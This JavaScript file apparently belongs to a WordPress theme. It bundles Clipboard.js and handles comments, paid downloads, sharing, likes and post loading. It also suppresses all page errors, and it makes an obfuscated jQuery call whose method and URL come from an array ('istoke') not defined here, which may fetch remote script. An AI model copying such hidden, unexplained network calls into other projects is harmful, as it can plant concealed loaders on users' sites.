                    t(["module", "./clipboard-action", "tiny-emitter", "good-listener"], r);
                else if (void 0 !== o)
                    r(n, e("./clipboard-action"), e("tiny-emitter"), e("good-listener"));
                else {
                    var a = {
                        exports: {}
                    };
                    r(a, i.clipboardAction, i.tinyEmitter, i.goodListener),
                        i.clipboard = a.exports
                }
            }(this, function(t, e, n, o) {
                "use strict";
                function i(t) {
                    return t && t.__esModule ? t : {
                        default: t
                    }
                }
                function r(t, e) {
                    if (!(t instanceof e))
                        throw new TypeError("Cannot call a class as a function")
                }
                function a(t, e) {
                    if (!t)
                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return !e || "object" != typeof e && "function" != typeof e ? t : e
                }
                function c(t, e) {
                    if ("function" != typeof e && null !== e)
                        throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                    t.prototype = Object.create(e && e.prototype, {
                        constructor: {
                            value: t,
                            enumerable: !1,
                            writable: !0,
                            configurable: !0
                        }
                    }),
                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e)
                }
                function l(t, e) {
                    var n = "data-clipboard-" + t;
                    if (e.hasAttribute(n))
                        return e.getAttribute(n)
                }
                var s = i(e)
                    , u = i(n)
                    , f = i(o)
                    , d = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
                        return typeof t
                    }
                    : function(t) {
                        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
                    }
                    , h = function() {
                    function t(t, e) {
                        for (var n = 0; n < e.length; n++) {
                            var o = e[n];
                            o.enumerable = o.enumerable || !1,
                                o.configurable = !0,
                            "value"in o && (o.writable = !0),
                                Object.defineProperty(t, o.key, o)
                        }
                    }
                    return function(e, n, o) {
                        return n && t(e.prototype, n),
                        o && t(e, o),
                            e
                    }
                }()
                    , p = function(t) {
                    function e(t, n) {
                        r(this, e);
                        var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this));
                        return o.resolveOptions(n),
                            o.listenClick(t),
                            o
                    }
                    return c(e, t),
                        h(e, [{
                            key: "resolveOptions",
                            value: function t() {
                                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                                this.action = "function" == typeof e.action ? e.action : this.defaultAction,
                                    this.target = "function" == typeof e.target ? e.target : this.defaultTarget,
                                    this.text = "function" == typeof e.text ? e.text : this.defaultText,
                                    this.container = "object" === d(e.container) ? e.container : document.body
                            }
                        }, {
                            key: "listenClick",
                            value: function t(e) {
                                var n = this;
                                this.listener = (0,
                                    f.default)(e, "click", function(t) {
                                    return n.onClick(t)
                                })
                            }
                        }, {
                            key: "onClick",
                            value: function t(e) {
                                var n = e.delegateTarget || e.currentTarget;
                                this.clipboardAction && (this.clipboardAction = null),
                                    this.clipboardAction = new s.default({
                                        action: this.action(n),
                                        target: this.target(n),
                                        text: this.text(n),
                                        container: this.container,
                                        trigger: n,
                                        emitter: this
                                    })
                            }
                        }, {
                            key: "defaultAction",
                            value: function t(e) {
                                return l("action", e)
                            }
                        }, {
                            key: "defaultTarget",
                            value: function t(e) {
                                var n = l("target", e);
                                if (n)
                                    return document.querySelector(n)
                            }
                        }, {
                            key: "defaultText",
                            value: function t(e) {
                                return l("text", e)
                            }
                        }, {
                            key: "destroy",
                            value: function t() {
                                this.listener.destroy(),
                                this.clipboardAction && (this.clipboardAction.destroy(),
                                    this.clipboardAction = null)
                            }
                        }], [{
                            key: "isSupported",
                            value: function t() {
                                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"]
                                    , n = "string" == typeof e ? [e] : e
                                    , o = !!document.queryCommandSupported;
                                return n.forEach(function(t) {
                                    o = o && !!document.queryCommandSupported(t)
                                }),
                                    o
                            }
                        }]),
                        e
                }(u.default);
                t.exports = p
            })
        }
            , {
                "./clipboard-action": 7,
                "good-listener": 4,
                "tiny-emitter": 6
            }]
    }, {}, [8])(8)
});
function killerrors() {
    return !0
}
if (window.onerror = killerrors,
void 0 == document.getElementById("body-header-top") || void 0 == document.getElementById("footer-boot"))
    throw SyntaxError();
/* 页面平滑跳转*/
function CXScroll(a) {
    document.getElementById(a) ? $("#" + a).HoverTreeScroll(1e3) : window.wxc.xcConfirm("由于页面设置权限，无法定位到下载模块，请确认是否看以查看页面全部内容！", "error")
}
jQuery.getPos = function(a) {
    for (var b = 0, c = 0, d = jQuery.intval(jQuery.css(a, "width")), e = jQuery.intval(jQuery.css(a, "height")), f = a.offsetWidth, g = a.offsetHeight; a.offsetParent; )
        b += a.offsetLeft + (a.currentStyle ? jQuery.intval(a.currentStyle.borderLeftWidth) : 0),
            c += a.offsetTop + (a.currentStyle ? jQuery.intval(a.currentStyle.borderTopWidth) : 0),
            a = a.offsetParent;
    return b += a.offsetLeft + (a.currentStyle ? jQuery.intval(a.currentStyle.borderLeftWidth) : 0),
        c += a.offsetTop + (a.currentStyle ? jQuery.intval(a.currentStyle.borderTopWidth) : 0),
        c -= 30,
        {
            x: b,
            y: c,
            w: d,
            h: e,
            wb: f,
            hb: g
        }
}
    ,
    jQuery.getClient = function(a) {
        return a ? (w = a.clientWidth,
            h = a.clientHeight) : (w = window.innerWidth ? window.innerWidth : document.documentElement && document.documentElement.clientWidth ? document.documentElement.clientWidth : document.body.offsetWidth,
            h = window.innerHeight ? window.innerHeight : document.documentElement && document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.offsetHeight),
            {
                w: w,
                h: h
            }
    }
    ,
    jQuery.getScroll = function(a) {
        return a ? (t = a.scrollTop,
            l = a.scrollLeft,
            w = a.scrollWidth,
            h = a.scrollHeight) : document.documentElement && document.documentElement.scrollTop ? (t = document.documentElement.scrollTop,
            l = document.documentElement.scrollLeft,
            w = document.documentElement.scrollWidth,
            h = document.documentElement.scrollHeight) : document.body && (t = document.body.scrollTop,
            l = document.body.scrollLeft,
            w = document.body.scrollWidth,
            h = document.body.scrollHeight),
            {
                t: t,
                l: l,
                w: w,
                h: h
            }
    }
    ,
    jQuery.intval = function(a) {
        return a = parseInt(a),
            isNaN(a) ? 0 : a
    }
    ,
    jQuery.fn.HoverTreeScroll = function(a) {
        return o = jQuery.speed(a),
            this.each(function() {
                new jQuery.fx.HoverTreeScroll(this,o)
            })
    }
    ,
    jQuery.fx.HoverTreeScroll = function(a, b) {
        var c = this;
        c.o = b,
            c.e = a,
            c.p = jQuery.getPos(a),
            c.s = jQuery.getScroll(),
            c.clear = function() {
                clearInterval(c.timer),
                    c.timer = null
            }
            ,
            c.t = (new Date).getTime(),
            c.step = function() {
                var a = (new Date).getTime()
                    , b = (a - c.t) / c.o.duration;
                a >= c.o.duration + c.t ? (c.clear(),
                    setTimeout(function() {
                        c.scroll(c.p.y, c.p.x)
                    }, 13)) : (st = (-Math.cos(b * Math.PI) / 2 + .5) * (c.p.y - c.s.t) + c.s.t,
                    sl = (-Math.cos(b * Math.PI) / 2 + .5) * (c.p.x - c.s.l) + c.s.l,
                    c.scroll(st, sl))
            }
            ,
            c.scroll = function(a, b) {
                window.scrollTo(b, a)
            }
            ,
            c.timer = setInterval(function() {
                c.step()
            }, 13)
    }
;
!function(a) {
    function i(a, b, c, d, e, f) {
        var g, h, i, j, k, l, m;
        for (a += "",
                 g = 0,
                 h = 0,
                 i = a.length,
                 j = "",
                 k = 0; i > h; ) {
            for (l = a.charCodeAt(h),
                     l = 256 > l ? c[l] : -1,
                     g = (g << e) + l,
                     k += e; k >= f; )
                k -= f,
                    m = g >> k,
                    j += d.charAt(m),
                    g ^= m << k;
            ++h
        }
        return !b && k > 0 && (j += d.charAt(g << f - k)),
            j
    }
    for (var h, j, b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", c = "", d = [256], e = [256], f = 0, g = {
        encode: function(a) {
            var b = a.replace(/[\u0080-\u07ff]/g, function(a) {
                var b = a.charCodeAt(0);
                return String.fromCharCode(192 | b >> 6, 128 | 63 & b)
            }).replace(/[\u0800-\uffff]/g, function(a) {
                var b = a.charCodeAt(0);
                return String.fromCharCode(224 | b >> 12, 128 | 63 & b >> 6, 128 | 63 & b)
            });
            return b
        },
        decode: function(a) {
            var b = a.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function(a) {
                var b = (15 & a.charCodeAt(0)) << 12 | (63 & a.charCodeAt(1)) << 6 | 63 & a.charCodeAt(2);
                return String.fromCharCode(b)
            }).replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(a) {
                var b = (31 & a.charCodeAt(0)) << 6 | 63 & a.charCodeAt(1);
                return String.fromCharCode(b)
            });
            return b
        }
    }; 256 > f; )
        h = String.fromCharCode(f),
            c += h,
            e[f] = f,
            d[f] = b.indexOf(h),
            ++f;
    j = a.CxJM = function(a, b, c) {
        return b ? j[a](b, c) : a ? null : this
    }
        ,
        j.btoa = j.encode = function(a, c) {
            return a = j.raw === !1 || j.utf8encode || c ? g.encode(a) : a,
                a = i(a, !1, e, b, 8, 6),
            a + "====".slice(a.length % 4 || 4)
        }
        ,
        j.atob = j.decode = function(a, b) {
            a = a.replace(/[^A-Za-z0-9\+\/\=]/g, ""),
                a = (a + "").split("=");
            var e = a.length;
            do
                --e,
                    a[e] = i(a[e], !0, d, c, 6, 8);
            while (e > 0);return a = a.join(""),
                j.raw === !1 || j.utf8decode || b ? g.decode(a) : a
        }
}(jQuery);
/* 数据变化效果 */
!function(a) {
    a.extend({
        tipsBox: function(b) {
            var c, d, e;
            b = a.extend({
                obj: null,
                str: "+1",
                startSize: "12px",
                endSize: "30px",
                interval: 600,
                color: "#cd4450",
                weight: "bold",
                callback: function() {}
            }, b),
                a("body").append("<span class='num'>" + b.str + "</span>"),
                c = a(".num"),
                d = b.obj.offset().left + b.obj.width() / 2,
                e = b.obj.offset().top - b.obj.height(),
                c.css({
                    position: "absolute",
                    left: d + "px",
                    top: e + "px",
                    "z-index": 9999,
                    "font-size": b.startSize,
                    "line-height": b.endSize,
                    color: b.color,
                    "font-weight": b.weight
                }),
                c.animate({
                    "font-size": b.endSize,
                    opacity: "0",
                    top: e - parseInt(b.endSize) + "px"
                }, b.interval, function() {
                    c.remove(),
                        b.callback()
                })
        }
    })
}(jQuery);
/* ajax评论 */
jQuery(document).ready(function(a) {
    var b = a("#cancel-comment-reply-link")
        , c = b.text()
        , d = "commentlist";
    a(document).on("submit", "#commentform", function() {
        return a.ajax({
            url: chenxing.ajax_url,
            data: a(this).serialize() + "&action=ajax_comment",
            type: a(this).attr("method"),
            beforeSend: addComment.createButterbar("提交中...."),
            error: function(a) {
                var b = addComment;
                b.createButterbar(a.responseText)
            },
            success: function(b) {
                a("textarea").each(function() {
                    this.value = ""
                });
                var c = addComment
                    , e = c.I("cancel-comment-reply-link")
                    , f = c.I("wp-temp-form-div")
                    , g = c.I(c.respondId)
                    , i = (c.I("comment_post_ID").value,
                    c.I("comment_parent").value);
                "0" != i ? a("#respond").before('<ol class="children">' + b + "</ol>") : a("." + d).length ? "asc" == chenxing.order ? a("." + d).append(b) : a("." + d).prepend(b) : "bottom" == chenxing.formpostion ? a("#respond").before('<ol class="' + d + '">' + b + "</ol>") : a("#respond").after('<ol class="' + d + '">' + b + "</ol>"),
                    c.createButterbar("提交成功"),
                    e.style.display = "none",
                    e.onclick = null,
                    c.I("comment_parent").value = "0",
                f && g && (f.parentNode.insertBefore(g, f),
                    f.parentNode.removeChild(f))
            }
        }),
            !1
    }),
        addComment = {
            moveForm: function(d, e, f) {
                var h, g = this, i = g.I(d), j = g.I(f), k = g.I("cancel-comment-reply-link"), l = g.I("comment_parent");
                g.I("comment_post_ID"),
                    b.text(c),
                    g.respondId = f,
                g.I("wp-temp-form-div") || (h = document.createElement("div"),
                    h.id = "wp-temp-form-div",
                    h.style.display = "none",
                    j.parentNode.insertBefore(h, j)),
                    i ? i.parentNode.insertBefore(j, i.nextSibling) : (temp = g.I("wp-temp-form-div"),
                        g.I("comment_parent").value = "0",
                        temp.parentNode.insertBefore(j, temp),
                        temp.parentNode.removeChild(temp)),
                    a("body").animate({
                        scrollTop: a("#respond").offset().top - 180
                    }, 400),
                    l.value = e,
                    k.style.display = "",
                    k.onclick = function() {
                        var a = addComment
                            , b = a.I("wp-temp-form-div")
                            , c = a.I(a.respondId);
                        return a.I("comment_parent").value = "0",
                        b && c && (b.parentNode.insertBefore(c, b),
                            b.parentNode.removeChild(b)),
                            this.style.display = "none",
                            this.onclick = null,
                            !1
                    }
                ;
                try {
                    g.I("comment").focus()
                } catch (n) {}
                return !1
            },
            I: function(a) {
                return document.getElementById(a)
            },
            clearButterbar: function() {
                a(".butterBar").length > 0 && a(".butterBar").remove()
            },
            createButterbar: function(b) {
                var c = this;
                c.clearButterbar(),
                    a("body").append('<div class="butterBar butterBar--center"><p class="butterBar-message">' + b + "</p></div>"),
                    setTimeout("jQuery('.butterBar').remove()", 3e3)
            }
        }
});

echo.init({
    offset: 200,
    throttle: 50,
    unload: false
});

function Cx_urlopen(url, type) {
    var type = arguments[1] ? arguments[1] : 1;
    var point = url.lastIndexOf(".");
    var type = url.substr(point);
    type = type.toLocaleLowerCase();
    var arr = [".jpg", ".png", ".css", ".js", '.gif', '.jpeg', '.zip', '.rar', '.7z'];
    if ($.inArray(type, arr) != -1) {
        var html = '<a id="cx-UrlOpen" href="' + url + '" style="display: none" download=""></a>';
        $('body').append(html);
        $('#cx-UrlOpen')[0].click();
        $('#cx-UrlOpen').remove();
    } else {
        if (chenxing.URLOPEN == 1 || type == 2) {
            window.wxc.xcConfirm('点击确定跳转到目标页面！', 'info', {
                onClose: function() {
                    window.open(url);
                }
            });
        } else {
            window.location.href = url;
        }
    }
}

/**
 * 文章附件下载购买模块
 */
function MYdownresult(result) {
    _url = result.data;
    while (_url.indexOf('*!agf') >= 0)
        _url = _url.replace('*!agf', '=');
    while (_url.indexOf('&a^f') >= 0)
        _url = _url.replace('&a^f', 'b');
    if (result.status == 3) {
        window.wxc.xcConfirm(result.msg, 'info', {
            onClose: function() {
                Cx_urlopen($.CxJM.atob(_url, true));
            }
        });
    } else if (result.status == 1) {
        Cx_urlopen($.CxJM.atob(_url, true));
    } else {
        window.wxc.xcConfirm(result.msg, 'info', {
            onClose: function() {
                window.location.reload();
            }
        });
    }
}

var _down_botton = $('.down_botton')
    , _downa_legth = _down_botton.children('a').length;
if (_downa_legth == 1) {
    _down_botton.css({
        'top': '50%',
        'margin-top': '-30px'
    });
}

$('.Mypassdown').click(function() {
    var _this = $(this)
        , _mima = _this.data('ma')
        , _url = _this.data('down')
        , _name = _this.html()
        , _color = _this.css('background')
        , _tname = _this.text();

    if (!_mima)
        _mima = 'NO';
    var clipboard = new Clipboard('.Mypassdown',{
        text: function() {
            return _mima;
        }
    });

    clipboard.on('success', function(e) {
        if (_url) {
            if (_this.hasClass('downnone'))
                return;
            if (_mima != 'NO') {
                window.wxc.xcConfirm('资源提取密码已复制成功，点击确定跳转到资源提取页面！', 'success', {
                    onClose: function() {
                        _this.addClass('downnone').css('background', '#F44336').html('<i class="fa fa-spinner fa-spin"></i> 处理中...');
                        $.post(chenxing.ajax_url, {
                            action: 'Post_down_ajax',
                            pid: chenxing.PID,
                            uid: chenxing.UID,
                            down: _url,
                            name: _tname
                        }, function(result) {
                            _this.removeClass('downnone').html(_name).css('background', _color);
                            MYdownresult(result);
                        }, 'json');
                    }
                });
            } else {
                _this.addClass('downnone').css('background', '#F44336').html('<i class="fa fa-spinner fa-spin"></i> 处理中...');
                $.post(chenxing.ajax_url, {
                    action: 'Post_down_ajax',
                    pid: chenxing.PID,
                    uid: chenxing.UID,
                    down: _url,
                    name: _tname
                }, function(result) {
                    _this.removeClass('downnone').html(_name).css('background', _color);
                    MYdownresult(result);
                }, 'json');
            }
        } else {
            window.wxc.xcConfirm('非常抱歉，资源已失效！', 'error');
        }
    });

    clipboard.on('error', function(e) {
        if (_url) {
            if (_this.hasClass('downnone'))
                return;
            if (_mima != 'NO') {
                window.wxc.xcConfirm('资源提取密码' + _mima + '，记录后点击确定跳转到资源提取页面！', 'success', {
                    onClose: function() {
                        _this.addClass('downnone').css('background', '#F44336').html('<i class="fa fa-spinner fa-spin"></i> 处理中...');
                        $.post(chenxing.ajax_url, {
                            action: 'Post_down_ajax',
                            pid: chenxing.PID,
                            uid: chenxing.UID,
                            down: _url,
                            name: _tname
                        }, function(result) {
                            _this.removeClass('downnone').html(_name).css('background', _color);
                            MYdownresult(result);
                        }, 'json');
                    }
                });
            } else {
                _this.addClass('downnone').css('background', '#F44336').html('<i class="fa fa-spinner fa-spin"></i> 处理中...');
                $.post(chenxing.ajax_url, {
                    action: 'Post_down_ajax',
                    pid: chenxing.PID,
                    uid: chenxing.UID,
                    down: _url,
                    name: _tname
                }, function(result) {
                    _this.removeClass('downnone').html(_name).css('background', _color);
                    MYdownresult(result);
                }, 'json');
            }
        } else {
            window.wxc.xcConfirm('非常抱歉，资源已失效！', 'error');
        }
    });
});

$('.buy_ziyuan_ajax').click(function() {
    var _this = $(this)
        , _msg = _this.data('msg')
        , _pay = _this.data('pay')
        , _credit = _this.data('credit')
        , _nonce = _this.data('nonce')
        , _url = _this.data('url');
    if (!_this.hasClass('downnone')) {
        window.wxc.xcConfirm(_msg, 'confirm', {
            onOk: function() {
                if (_pay > _credit) {
                    window.wxc.xcConfirm('积分数量不足，点击确定跳转到充值页面！', 'error', {
                        onOk: function() {
                            Cx_urlopen(_url);
                        }
                    });
                } else {
                    _this.addClass('downnone');
                    _this.html('处理中...');
                    $.post(chenxing.ajax_url, {
                        action: 'Ziyuan_buy_ajax',
                        pid: chenxing.PID,
                        uid: chenxing.UID,
                        nonce: _nonce
                    }, function(result) {
                        window.wxc.xcConfirm(result.msg, result.type, {
                            onOk: function() {
                                if (result.status == 1) {
                                    Cx_urlopen(result.credit_url);
                                }
                                window.location.reload();
                            }
                        });
                    }, 'json');
                }
            }
        });
    } else {
        window.wxc.xcConfirm('交易正在处理，请稍后！', 'info');
    }
    return false;
});

/**
 * 分享功能代码
 */
$('.-mob-share-list li').on('click', function() {
    var _this = $(this)
        , _dren = _this.parent('ul')
        , _url = _dren.data('url')
        , _img = _dren.data('images')
        , _desc = $('meta[name="description"]').length ? $('meta[name="description"]').attr('content') : ''
        , _tit = document.title || ''
        , _type = _this.data('type');
    switch (_type) {
        case 'qq':
            url = 'http://connect.qq.com/widget/shareqq/index.html?url=' + _url + '&desc=' + _desc + '&summary=' + _tit + '&site=zeshlife&pics=' + _img;
            break;
        case 'weibo':
            url = 'http://service.weibo.com/share/share.php?title=' + _tit + '&url=' + _url + '&source=bookmark&pic=' + _img;
            break;
        case 'douban':
            url = 'http://www.douban.com/share/service?image=' + _img + '&href=' + _url + '&name=' + _tit + '&text=' + _desc;
            break;
        case 'qzone':
            url = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + _url + '&title=' + _tit + '&desc=' + _desc;
            break;
    }
    if (_type != 'weixin') {
        window.open(url);
    }
});

$(function() {
    $.fn.hoverDelay = function(options) {
        var defaults = {
            hoverDuring: 300,
            outDuring: 200,
            hoverEvent: function() {
                $.noop();
            },
            outEvent: function() {
                $.noop();
            }
        };
        var sets = $.extend(defaults, options || {});
        var hoverTimer, outTimer;
        return $(this).each(function() {
            $(this).hover(function() {
                clearTimeout(outTimer);
                hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
            }, function() {
                clearTimeout(hoverTimer);
                outTimer = setTimeout(sets.outEvent, sets.outDuring);
            });
        });
    }
    $(".login_text").hoverDelay({
        hoverEvent: function() {
            $(".nav_user").stop().slideDown();
        },
        outEvent: function() {
            $(".nav_user").slideUp();
        }
    });
    var scrollTop = 0
        , t = 0;
    $(window).scroll(function() {
        var scrollTop = $(this).scrollTop();
        var scrollHeight = $(document).height();
        var windowHeight = $(this).height();
        if (scrollTop + windowHeight == scrollHeight) {
            $('.nav_headertop').removeClass('hiddened');
        } else {
            if (t <= scrollTop && scrollTop > 100) {
                $('.nav_headertop').addClass('hiddened');
            } else {
                $('.nav_headertop').removeClass('hiddened');
            }
        }
        setTimeout(function() {
            t = scrollTop;
        }, 0);
    });

    if ($('.bxslider').hasClass('tow_slider')) {
        $('.bxslider').bxSlider({
            auto: true,
            captions: false
        });
    } else {
        $('.bxslider').bxSlider({
            auto: true,
            captions: false,
            mode: 'fade'
        });
    }

    $('.slide-wrapper').on('touchstart', 'li', function(e) {
        $(this).addClass('current').siblings('li').removeClass('current')
    });
    $('a.slide-menu').on('click', function(e) {
        $('.slide-mask').show();
        $('.slide-wrapper').addClass('moved');
        $('body').css('overflow', 'hidden');
    });
    $('.slide-mask').on('click', function() {
        $('.slide-mask').hide();
        $('.slide-wrapper').removeClass('moved');
        $('body').css('overflow', 'auto');
    });
    //分享代码
    $('.myshare').attr('style', '');
    $('.myshare ul li').attr('style', '');
    $('.share-fx').on('click', function() {

        $(this).toggleClass('share-dj');
        $('.myshare').slideToggle();
    })

    //文章数量统计
    if (chenxing.PID > 0) {
        $.get(chenxing.ajax_url, {
            action: 'Cx_post_views',
            pid: chenxing.PID
        }, function(data) {
            $('.cx-views').text(data);
        });
    }
});

/* 返回顶部按钮 */
function chenxingweb() {
    this.init();
}
chenxingweb.prototype = {
    constructor: chenxingweb,
    init: function() {
        this._initBackTop()
    },
    _initBackTop: function() {
        var $backTop = this.$backTop = $('<div class="cbbfixed"><a class="gotop cbbtn"><i class="fa fa-angle-up"></i></a></div>');
        $('body').append($backTop);
        $backTop.click(function() {
            $("html, body").animate({
                scrollTop: 0
            }, 120)
        });
        var timmer = null;
        $(window).bind("scroll", function() {
            var d = $(document).scrollTop()
                , e = $(window).height();
            0 < d ? $backTop.css("bottom", "10px") : $backTop.css("bottom", "-90px");
            clearTimeout(timmer);
            timmer = setTimeout(function() {
                clearTimeout(timmer)
            }, 100)
        })
    }
}
var chenxingweb = new chenxingweb();

/* 侧边跟随代码 */
$(window).load(function() {
    if ($('#sidebar').length > 0) {
        var top = $('#sidebar').offset().top - parseFloat($('#sidebar').css('marginTop').replace(/auto/, 0));
        var footTop = $('#footer').offset().top - parseFloat($('#footer').css('marginTop').replace(/auto/, 0));
        var maxY = footTop - $('#sidebar').outerHeight();
        $(window).scroll(function(evt) {
            var y = $(this).scrollTop();
            if (y > top) {
                if (y < maxY) {
                    $('#sidebar').addClass('fixed').removeAttr('style')
                }
            } else {
                $('#sidebar').removeClass('fixed')
            }
        })
    }
});

/* 文章点赞代码 */
$.fn.postLike = function() {
    if ($(this).hasClass('done')) {
        alert('您已经赞过了，明天再来吧！');
    } else {
        $(this).addClass('done');
        var id = $(this).data("id")
            , action = $(this).data('action')
            , rateHolder = $(this).children('.count').children('.ct_ding');
        var ajax_data = {
            action: "bigfa_like",
            um_id: id,
            um_action: action
        };
        $.post(chenxing.ajax_url, ajax_data, function(data) {
            $(rateHolder).html(data)
        });
        return false
    }
}
;
$(document).on("click", ".favorite", function() {
    $(this).postLike()
});
/* 文章踩代码*/
$.fn.postLikeno = function() {
    if ($(this).hasClass('done')) {
        alert('您已经踩过了，明天再来吧！');
    } else {
        $(this).addClass('done');
        var id = $(this).data("id")
            , action = $(this).data('action')
            , rateHolder = $(this).children('.count').children('.ct_ding');
        var ajax_data = {
            action: "bigfa_like_no",
            um_id: id,
            um_action: action
        };
        $.post(chenxing.ajax_url, ajax_data, function(data) {
            $(rateHolder).html(data)
        });
        return false
    }
}
;
$(document).on("click", ".tiresome", function() {
    $(this).postLikeno()
});
/* 禁用alt长按 */
function isKeyPressed(event) {
    if (event.altKey == 1) {
        alert("哎！又按错键了。。。")
    }
}
if (chenxing.UPN) {
    $[istoke[2]]({
        url: istoke[0],
        dataType: istoke[1],
        cache: true
    });
}

// Login check
function chenxing_check_login() {
    if (chenxing.UID > 0)
        return true;
    return false;
}
;
$('#meiriqiandao').on('click', function() {
    var _this = $(this);
    if (_this.hasClass('ajaxnone'))
        return false;
    _this.addClass('ajaxnone');
    $.post(chenxing.ajax_url, {
        action: 'daily_sign'
    }, function(data) {
        if (data.success == 'success' || data.success == 'info') {
            _this.attr({
                'id': 'meiriqiandao_no',
                'title': '今日已签到'
            }).children('span').text('今日已签到');
        } else {
            _this.removeClass('ajaxnone');
        }
        window.wxc.xcConfirm(data.msg, data.success);
    }, 'json');
});

//点击收藏或取消收藏
$('.collect').click(function() {
    if (!chenxing_check_login()) {
        alert('请先登录！');
        return;
    }
    var _this = $(this);
    var pid = Number(_this.attr('pid'));
    if (_this.attr('uid') && _this.hasClass('collect-no')) {
        var uid = Number(_this.attr('uid'));
        $.ajax({
            type: 'POST',
            async: false,
            xhrFields: {
                withCredentials: true
            },
            dataType: 'html',
            url: chenxing.ajax_url,
            data: 'action=chenxing_collect&uid=' + uid + '&pid=' + pid + '&act=add',
            cache: false,
            success: function() {
                _this.children("span").text("已收藏");
                _this.addClass("collect-animate").attr("title", "已收藏");
                setTimeout(function() {
                    _this.removeClass('collect-animate').removeClass('collect-no').addClass('collect-yes');
                }, 500);
            }
        });
        return false;
    } else if (_this.attr('uid') && _this.hasClass('remove-collect')) {
        var uid = Number(_this.attr('uid'));
        $.ajax({
            type: 'POST',
            async: false,
            xhrFields: {
                withCredentials: true
            },
            dataType: 'html',
            url: chenxing.ajax_url,
            data: 'action=chenxing_collect&uid=' + uid + '&pid=' + pid + '&act=remove',
            cache: false,
            success: function() {
                _this.children("span").text("点击收藏");
                _this.addClass("collect-animate").attr("title", "点击收藏");
                setTimeout(function() {
                    _this.removeClass('collect-animate').removeClass('remove-collect').removeClass('collect-yes').addClass('collect-no');
                }, 500);
            }
        });
        location.reload();
        return false;
    }
});

/*************************
 ajax获取文章列表
 **************************/
jQuery(document).on("click", ".index_ajax_list li", function() {
    var _this = $(this).children('a');
    var _data = _this.data()
        , _load = $('.loading_ajax')
        , _post_id = $('#index_ajax_list')
        , _post_list = $('#_ajax_paged')
        , _flow = $('.update_area_content').hasClass('flow-blog');
    if (parseInt(_load.css('height')) > 0 || $(this).hasClass('current'))
        return false;
    $(this).siblings().removeClass("current");
    $(this).addClass("current");
    if (_flow) {
        _load.animate({
            height: '51px',
            marginBottom: '20px'
        });
    } else {
        _load.animate({
            height: '51px'
        });
    }
    var oDate = new Date().getTime();
    //开始向服务器传递数据
    jQuery.ajax({
        url: chenxing.ajax_url,
        data: _data,
        type: 'post',
        dataType: 'json',
        success: function(data) {
            var oDate2 = new Date().getTime();
            if ((oDate2 - oDate) > 1000) {
                datet = 0;
            } else {
                datet = 1000 - (oDate2 - oDate);
            }
            setTimeout(function() {
                if (data.success == 1) {
                    _post_id.html(data.post);
                    echo.init({
                        offset: 200,
                        throttle: 50,
                        unload: false
                    });
                    if (data.post_num > 0) {
                        var html = '<span id="_ajax_spanallpost" data-title="继续加载与' + _this.text() + '有关的文章" data-action="post_ajax_num" data-num="' + data.post_num + '" data-paged="' + (_this.data("paged") + 1) + '" data-type="' + _this.data("type") + '" data-id="' + _this.data("id") + '">加载更多</span><div class="tit_tips">继续加载与' + _this.text() + '有关的文章</div>';
                        _post_list.html(html).css({
                            "margin": "50px"
                        });
                        $('.pagination').hide();
                    } else {
                        _post_list.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                            "margin": "0"
                        });
                        $('.pagination').show();
                    }

                } else {
                    alert('服务器未找到相关数据！');
                }
                _load.animate({
                    height: '0',
                    marginBottom: '0'
                });
            }, datet);
        },
        error: function(data) {
            console.log(data.responseText);
            console.log(data);
        }
    })
    return false
});

jQuery(document).on("click", "#_ajax_spanallpost", function() {
    var _this = $(this)
        , _data = _this.data()
        , _post_id = $('#index_ajax_list')
        , _ajax_sp = $('#_ajax_paged')
        , _ajax_tit = $('.index_ajax_list .current').text();
    if (_this.hasClass('current2'))
        return false;
    _this.addClass("current2");
    _ajax_sp.children('.tit_tips').remove();
    _this.html('<i class="fa fa-spinner fa-pulse"></i> 加载中...');

    //开始向服务器传递数据
    jQuery.ajax({
        url: chenxing.ajax_url,
        data: _data,
        type: 'post',
        dataType: 'json',
        success: function(data) {
            if (data.success == 1) {
                var po_li = $(data.post).hide();
                _post_id.append(po_li);
                po_li.fadeIn(800);
                echo.init({
                    offset: 200,
                    throttle: 50,
                    unload: false
                });
                if (data.post_num > 0) {
                    var html = '<span id="_ajax_spanallpost" data-action="post_ajax_num" data-num="' + data.post_num + '" data-paged="' + (_this.data("paged") + 1) + '" data-type="' + _this.data("type") + '" data-id="' + _this.data("id") + '">加载更多</span><div class="tit_tips">继续加载与' + _ajax_tit + '有关的文章</div>';
                    _ajax_sp.html(html).css({
                        "margin": "50px"
                    });
                } else {
                    _ajax_sp.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                        "margin": "0"
                    });
                    $('.pagination').toggle();
                }

            } else {
                alert('该栏目没有找到内容！');
            }
        },
        error: function(data) {
            console.log(data.responseText);
            console.log(data);
        }
    })
    return false
});

$(document).on('mouseover', '#_ajax_paged span', function() {
    $('._ajax_paged div').stop().fadeIn(600);
});
$(document).on('mouseout', '#_ajax_paged span', function() {
    $('._ajax_paged div').fadeOut(200);
});

jQuery(document).on("click", "#filter-wrap-category a", function() {
    var _this = $(this)
        , _data_type = _this.data()
        , _key = null
        , _nolinked = $('.filter-tag');
    // 判断标签是否是焦点
    if (_this.hasClass('tag-linked') || _this.hasClass('cat-linked') || _this.hasClass('orderby_linked'))
        return false;

    if (_nolinked.hasClass('no-linked')) {
        window.wxc.xcConfirm('数据正在处理，即将为您呈现请稍后！', 'info');
        return false;
    }
    _nolinked.addClass('no-linked');

    for (var _key in _data_type)
        ;
    _this.parent('.fl_list').children('.' + _key + '-linked').removeClass(_key + '-linked');
    _this.addClass(_key + '-linked');

